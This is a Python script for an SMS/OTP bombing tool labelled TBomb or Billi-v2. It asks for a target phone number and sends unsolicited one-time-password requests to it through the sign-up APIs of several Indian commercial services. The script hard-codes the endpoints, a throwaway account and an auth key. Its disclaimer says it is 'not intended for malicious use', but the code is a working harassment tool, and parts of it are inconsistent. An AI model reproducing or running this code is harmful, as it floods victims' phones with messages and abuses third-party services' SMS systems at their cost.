#!/usr/bin/python
# -*- coding: UTF-8 -*-
import argparse
import os
import shutil
import sys
import subprocess
import requests
import time
import json
from io import BytesIO

from concurrent.futures import ThreadPoolExecutor, as_completed

from utils.decorators import MessageDecorator

try:
    from colorama import Fore, Style
except ImportError:
    print("\tSome dependencies could not be imported (possibly not installed)")
    print(
        "Type `pip3 install -r requirements.txt` to "
        " install all required packages")
    sys.exit(1)


def get_version():
    try:
        return open(".version", "r").read().strip()
    except Exception:
        return '1.0'


def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def bann_text():
    clr()
    logo = """
    ░███████░░██░░██░░██░░░░░██
    ░██░░░██░░██░░██░░██░░░░░██
    ░███████░░██░░██░░██░░░░░██
    ░██░░░██░░██░░██░░██░░░░░██
    ░███████░░██░░██░░██████░██
    """
    version = "Version: " + __VERSION__
    print(Fore.GREEN + logo + Style.RESET_ALL)
    mesgdcrt.SuccessMessage(version)
    print()


def check_for_updates():
    mesgdcrt.SectionMessage("Checking for updates")
    fver = requests.get(
        "https://raw.githubusercontent.com/anshsx/billi-v2/master/.version"
    ).text.strip()
    if fver != __VERSION__:
        mesgdcrt.WarningMessage("An update is available")
        mesgdcrt.GeneralMessage("Starting update...")
        sys.exit()
    else:
        mesgdcrt.SuccessMessage("TBomb is up-to-date")
        mesgdcrt.GeneralMessage("Starting TBomb")


def get_phone_info():
    while True:
        target = input(mesgdcrt.CommandMessage("Enter your mobile number (without country code): "))
        if len(target) <= 6 or len(target) >= 12:
            mesgdcrt.WarningMessage(f"The phone number ({target}) is invalid")
            continue
        return target


def send_otp(provider, target):
    try:
        if provider["method"] == "GET":
            response = requests.get(provider["url"], params={**provider["params"], "mobileNumber": target})
        elif provider["method"] == "POST":
            response = requests.post(provider["url"], data={**provider["data"], "phone": target})
        if response.status_code == 200:
            mesgdcrt.SuccessMessage(f"OTP sent successfully to {target}")
        else:
            mesgdcrt.FailureMessage(f"Failed to send OTP to {target}")
    except Exception as e:
        mesgdcrt.FailureMessage(f"Error sending OTP: {str(e)}")


def workernode(target, providers):
    for provider in providers:
        send_otp(provider, target)


def selectnode():
    try:
        clr()
        bann_text()
        check_for_updates()

        target = get_phone_info()

        providers = [
            {
                "name": "confirmtkt",
                "method": "GET",
                "url": "https://securedapi.confirmtkt.com/api/platform/register",
                "params": {"newOtp": "true"},
                "identifier": "false"
            },
            {
                "name": "housing",
                "method": "POST",
                "url": "https://login.housing.com/api/v2/send-otp",
                "data": {"phone": "{target}"},
                "identifier": "Sent"
            },
            {
                "name": "ajio",
                "method": "POST",
                "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
                "data": {
                    "firstName": "xxps",
                    "login": "wiqpdl223@wqew.com",
                    "password": "QASpw@1s",
                    "genderType": "Male",
                    "mobileNumber": target,
                    "requestType": "SENDOTP"
                },
                "identifier": "Sent"
            },
            {
                "name": "grofers",
                "method": "POST",
                "url": "https://grofers.com/v2/accounts/",
                "headers": {
                    "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Accept-Language": "en-US,en;q=0.9"
                },
                "data": {"user_phone": target}
            }
        ]

        workernode(target, providers)
    except KeyboardInterrupt:
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()


mesgdcrt = MessageDecorator("icon")

if sys.version_info[0] != 3:
    mesgdcrt.FailureMessage("Billi will work only in Python v3")
    sys.exit()

__VERSION__ = get_version()

description = """TBomb - SMS Bombing Tool

Billi-v2 is used for sending multiple OTP requests to mobile numbers via different APIs.
It is not intended for malicious use.
"""

parser = argparse.ArgumentParser(description=description)
parser.add_argument("-v", "--version", action="store_true", help="show current TBomb version")
parser.add_argument("-u", "--update", action="store_true", help="update TBomb")

if __name__ == "__main__":
    args = parser.parse_args()

    if args.version:
        print("Version: ", __VERSION__)
    elif args.update:
        sys.exit()
    else:
        selectnode()

    sys.exit()
